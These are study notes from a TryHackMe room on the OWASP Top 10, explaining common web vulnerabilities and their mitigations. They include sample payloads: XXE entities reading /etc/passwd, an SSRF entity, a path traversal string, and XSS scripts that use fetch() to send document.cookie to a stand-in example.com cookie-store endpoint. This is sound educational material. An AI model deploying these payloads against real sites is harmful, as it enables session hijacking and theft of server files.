# Tryhackme - OWASP TOP 10

#### https://tryhackme.com/room/owasptop10

### 1 Injection

Any kind of un-sanitized user input has chances of injection. Various types:

-   SQL injection (SQLi): unauthorized DBMS modification or retrieval
-   Command injection (RCE): Direct CLI access to server's underlying OS
-   File upload: Image file containing PHP/XML could be parsed by the server when requested

Mitigating SQLi with python mysql:

```
# UNSAFE

sql_command = "SELECT password FROM USERS WHERE name = {}".format(user_name_input)
mysql.execute(sql_command)
```

Even though the `sql_command` isn't made with string concatenation, it can still cause arbitrary input to be parsed by the `execute()` function.

```
# SAFE:

sql_command = "SELECT password FROM USERS WHERE name = %s"
mysql.execute(sql_command, (user_name_input,))
```

### 2 Broken Authentication

-   short passwords lead to brute force attacks: implement timeout after some failed login attempts
-   unsafe cookies such as not setting httpOnly flag or them being guessable can cause session hijacking

### 3 Sensitive Data Exposure

-   improper storage of passwords as plaintext or hashed without salting or using a weak hash function such as MD5 or SHA1
-   not restricting direct folder listing using ACLs
-   leaving sensitive information under the website's root folder for eg. `sqlite.db`
-   Path Traversal i.e. `../../../etc/passwd`
-   not masking `403 Forbidden` as `404 Not Found`

### 4 XML External Entity (XXE)

eXtensible Markup Language (XML) is a markup language similar to HTML which can be used by servers for data communication. It has certain features which are vulnerable to injection that can be used for file retrieval, SSRF, etc. In order to find an XXE, all nodes of the original XML request have to be tested individually.

A markup language is one that looks like:

```
<root>
    <name>
        Sam
    </name>
    <age>
        25
    </age>
</root>
```

-   SSRF Payload

    Situation: Frontend sends user input from "edit name" page as XML to backend which is vulnerable to XXE
    Result: Contents of internal firewall-ed website will be displayed on user profile

    ```
    <!DOCTYPE root [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
    <userInfo>
        <firstName>falcon</firstName>
        <lastName>&xxe;</lastName>
    </userInfo>
    ```

-   File Retrieval

    ```
    <?xml version="1.0"?>
    <!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
    <root>&read;</root>
    ```

-   File Retrieval with XInclude (build XML from another XML) when `DOCTYPE` editing is restricted

    ```
    <foo xmlns:xi="http://www.w3.org/2001/XInclude">
    <xi:include parse="text" href="file:///etc/passwd"/></foo>
    ```

-   HTTP Modify Content Type

    ```
    POST /action HTTP/1.0
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 7

    foo=bar
    ```

    changed to

    ```
    POST /action HTTP/1.0
    Content-Type: text/xml
    Content-Length: 52

    <?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
    ```

### 5 Broken Access Control

This occurs when a client is able to view a webpage that was not supposed to be shown to them. For example a non-admin user being able to access the admin page.

-   Insecure Direct Object Reference (IDOR)

    Let us assume that a bank website allows users (Bob in this case) to view their balance at `https://www.example.com/balance/1234` (where `1234` is their account number) after logging in.

    If Bob is able to view someone else's balance on altering this URL to `https://www.example.com/pictures/1235`, it's an IDOR vulnerability.

    In a secure system, the server should check if the account number whose balance is being requested matches with the logged in user's session cookie or even better the balance should be displayed at `https://www.example.com/balance/` based on the session cookie.

### 6 Security Misconfiguration

Security misconfigurations include:

-   using default and generic passwords such as `admin`, `administrator`, `user`, `guest`, etc.
-   improper relaxed permissions (ALLOW ALL)
-   displaying error messages in production
-   revealing HTTP headers, for e.g. server software name and version

### 7 Cross-site Scripting (XSS)

XSS is mostly used for session hijacking.

-   Persistant XSS

    A website's comment form doesn't filter HTML tags enabling a bad actor to submit the following payload as a comment, leading to all visitor's browsers giving away the visitor's cookies to the bad actor.

    ```
    sample comment
    <script>
        fetch(`https://www.example.com/cookie-store.php?cookie=${document.cookie}`);
    </script>
    ```

-   Reflective XSS

    Malicious links are the main vector for reflected XSS attacks since it involves the bad actor taking advantage of un-sanitized parameters in URLs.

    Example: A shopping website has a search URL `https:/shop.shop/search?q=laptop` that returns a page with the search results with the search query shown at the top as "There are 10 matches for _laptop_"

    A bad actor could send a modified link containing URL encoded JS to the user via email. When clicked the link will cause the malicious script to be embedded in the search results page if the website doesn't sanitize the user input, leading to the user's browser giving up their cookies.

    Modified malicious link: `https:/shop.shop/search?q=laptop%3Cscript%3Efetch%28%60https%3A%2F%2Fwww.example.com%2Fcookie-store.php%3Fcookie%3D%24%7Bdocument.cookie%7D%60%29%3B%3C%2Fscript%3E`

### 8 Insecure Deserialization

Data is usually encoded (or serialized with Base64 for example) before being stored in cookies. When the server reads these cookies on page load, the de-encoding process is known as deserialization.

Since cookies are stored client side, then can be manipulated by the user. If the server uses a cookie's value and stores it in a database or runs it as part of a command, it can lead to Remote Code Execution (RCE). Hence the server should sanitize the cookie's value before reading by eliminating system commands, HTML tags etc from it.

The safest option would be to store the cookie's value server-side itself but if for some reason it has to be stored client-side possible mitigations can be:

-   encrypt the cookie's contents and store only the key on server allowing the cookie value to be decrypted later
-   store cookie value hash on the server and verify of page load

### 9 Components with Known Vulnerabilities

Sites like https://www.exploit-db.com/ and https://cve.mitre.org/ list thousands of security vulnerabilities along with their exploit codes. If a server runs a program which suffers from any of the public vulnerabilities, a bad actor can instantly compromise it. Hence it's important to keep all programs updated to the latest versions available.

### 10 Insufficent Logging & Monitoring

In case of any cyber attack such as #3 Sensitive Data Exposure or #7 XSS, it's imperative that information such as the following should be available to be accessed.

-   scale of damage
-   users impacted
-   bad actors identity

For this reason, website access and database update logs containing the IPs, User Agent and other information about the clients should be saved securely and backed up periodically while preventing the bad actors from modifying or erasing them.
